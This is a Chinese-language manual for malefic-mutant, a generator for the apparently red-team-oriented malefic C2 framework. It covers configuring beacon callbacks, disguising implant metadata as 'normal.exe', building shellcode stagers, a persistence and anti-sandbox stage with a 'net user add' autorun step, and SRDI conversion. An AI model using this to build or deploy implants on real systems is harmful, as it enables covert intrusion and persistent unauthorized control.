---
title: Internal of Malice · implant手册
---

## Intro

 malefic 在v0.0.3中解耦为多个组件并新增了大量组件，可预见的将会有更多组件和模块出现在项目中， 因此配置生成/管理工具刻不容缓， 之前的 config 已经无法满足当前的需求， 我们新增了 malefic-mutant 代替原有的malefic-config

在设计中， mutant 的定位相当于 MSF venom， 可以动态解析和更改配置以动态生成代码， 也可以通过需求动态生成 shellcode 的 raw 文件.



## Install/Build

malefic-mutant 会随着每个版本自动编译对应的release. 直接下载即可使用

https://github.com/chainreactors/malefic/releases/latest


也支持从源码编译:

```
cargo build --release -p malefic-mutant 
```

!!! tips "编译环境"
	编译环境可以参考build中对应的配置流程: https://chainreactors.github.io/wiki/IoM/manual/implant/build/#_6

## Usage

malefic-mutant 目前有两大组件:

* generate： 根据配置动态生成代码
* build：创建可用的 shellcode/PE 文件

其中 generate 所依赖的配置均在 malefic/config.yaml 文件中

```bash
$ mutant --help
Config malefic beacon and prelude.

Usage: malefic-mutant.exe <COMMAND>

Commands:
  generate  Config related commands
  build     Generate related commands
  help      Print this message or the help of the given subcommand(s)

Options:
  -h, --help  Print help
```

## generate

generate是代码, 配置, 编译条件的生成器, 因此需要在源代码目录下使用.

如果还没有下载对应的源代码, 请先尝试clone malefic.

```
git clone --recurse-submodules https://github.com/chainreactors/malefic
```

generate 模块将会根据配置动态生成一切所需的代码（pulse, prelude, beacon...）


### beacon

#### 配置清单

由于 beacon 是整个功能的结合形态， 因此配置项略微复杂， 这里将其分为三部分来介绍

配置文件模板: https://github.com/chainreactors/malefic/blob/master/config.yaml

1. basic, 用于连接参数配置

```yaml
basic:  
  name: "malefic"  
  targets:  
    - "127.0.0.1:5001"  
  protocol: "tcp"  
  tls: false  
  proxy:  
  interval: 5  
  jitter: 0.2  
  ca:  
  encryption: aes  
  key: maliceofinternal  
  rem:  
    link:  
  http:  
    method: "POST"  
    path: "/pulse"  
    host: "127.0.0.1"  
    version: "1.1"  
    headers:  
      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
```

2. metadata, 基于resources实现的二进制文件基本信息配置
    
```yaml
metadata:  
  remap_path: "C:/Windows/Users/"  
  icon: ""  
  compile_time: "24 Jun 2015 18:03:01"  
  file_version: ""  
  product_version: ""  
  company_name: ""  
  product_name: ""  
  original_filename: "normal.exe"  
  file_description: "normal"  
  internal_name: ""  
  require_admin: false  # whether to require admin privilege  
  require_uac: false    # whether to require uac privilege
```

3. implants, 关于implant功能性配置

```yaml
implants:  
  runtime: tokio          # async runtime: smol/tokio/async-std  
  mod: beacon             # malefic mod: beacon/bind  
  register_info: true     # whether collect sysinfo when register  
  hot_load: true          # enable hot load module  
  modules:                # module when malefic compile  
    - "full"  
  enable_3rd: false       # enable 3rd module  
  3rd_modules:            # 3rd module when malefic compile  
    - "full"  
  autorun: ""             # autorun config filename  
  pack:                   # pack  
#    - src: "1.docx"  
#      dst: "1.docs"
```

##### 使用说明

```bash
Config beacon

Usage: malefic-mutant.exe generate beacon [OPTIONS]

Options:
  -h, --help               Print help
```

#### 使用示例

```bash
malefic-mutant generate beacon 
```

### pulse

pulse 作为目前的 shellcode 生成器， 由 mutant 通过解析配置来提供生成代码

#### 配置清单

其所依赖的配置位于 malefic/config.yaml 文件的 pulse 模块

```yaml
pulse:
  flags:
    start: 0x41             # 交互 body 的开始标志
    end: 0x42               # 交互 body 的结束标志
    magic: "beautiful"      # 随机校验
    artifact_id: 16         # 用于控制所拉取的阶段
  encryption: xor           # body 加密方式 (目前为 xor)
  key: "maliceofinternal"   # 加密的 `key` 值
  target: 127.0.0.1:5002    
  protocol: "tcp"           # 通信协议 (目前为 tcp)
  http:
    method: "GET"
    path: "/pulse.bin"
    version: "1.1"
    headers:
      user_agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0"
      accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
      accept_language: "en-US,en;q=0.5"
      accept_encoding: "gzip, deflate"
```

#### 使用说明

```bash
Generate pulse

Usage: malefic-mutant.exe generate pulse [OPTIONS] <ARCH> <PLATFORM>

Arguments:
  <ARCH>      Choice arch x86/x64
  <PLATFORM>  platform, win

Options:
  -h, --help               Print help
```

#### 使用示例

```bash
malefic-mutant generate pulse x64 win
```

### prelude

prelude 为可选的用于在上线前进行权限维持, 反沙箱, 反调试等功能的中间阶段

#### 使用说明

```bash
Config prelude

Usage: malefic-mutant.exe generate prelude [OPTIONS] <YAML_PATH>

Arguments:
  <YAML_PATH>

Options:
  --resources <RESOURCES>  Custom resources dir, default "./resources/" [default: resources]
  -h, --help                   Print help
```

#### autorun.yaml
yaml示例:

```yaml
-  
  name: bof  
  body: !ExecuteBinary  
    name: service  
    bin: !File "addservice.o"
-
  name: exe
  body: !ExecRequest
    args:
      - net
      - user
      - add
      - ....
  
```

这个yaml能被自动打包编译成`spite.bin`

```
malefic-mutant generate prelude autorun.yaml

cargo build -p malefic-prelude
```

能生成一个自动按顺序执行autorun.yaml 中配置的二进制程序.

### bind (Unstable)

在当前实际对抗中, 受到网络环境的限制, 很少有人使用 bind 类型的 webshell. 但在一些极端场景下, 例如不出网的webshell 中, 又或者长时间流量静默的场景下. bind 也许有用武之地

bind 作为新增的临时解决方案, 也由 mutant 来进行调配

```bash
Config bind

Usage: malefic-mutant.exe generate bind [OPTIONS]

Options:
  -h, --help               Print help
```
## build

build 作为一切可直接使用的结果文件生成器， 目前用于生成 `SRDI` 的 shellcode 产物

```bash
Generate related commands

Usage: malefic-mutant.exe build <COMMAND>

Commands:
  srdi        Generate SRDI
  help        Print this message or the help of the given subcommand(s)

Options:
  -h, --help  Print help
```

### SRDI

作为 PE2SHELLCODE 的常见解决方案， 该模块可以将我们的 prelude / beacon 转化为 shellcode 以供多段加载

```bash
Generate SRDI

Usage: malefic-mutant.exe build srdi [OPTIONS]

Options:
  -t, --type <TYPE>                    Srdi type: link(not support TLS)/malefic(support TLS) [default: malefic]
  -i, --input <INPUT>                  Source exec path [default: ]
  -p, --platform <PLATFORM>            platform, win [default: win]
  -a, --arch <ARCH>                    Choice arch x86/x64 [default: x64]
  -o, --output <OUTPUT>                Target shellcode path [default: malefic.bin]
      --function-name <FUNCTION_NAME>  Function name [default: ]
      --userdata-path <USERDATA_PATH>  User data path [default: ]
  -h, --help                           Print help
```

使用示例：

```bash
malefic-mutant build srdi -i ./beacon.exe

malefic-mutant build srdi -i ./beacon.exe -o x64 -o ./beacon.bin

malefic-mutant build srdi -i ./beacon.dll  --function-name "main"
```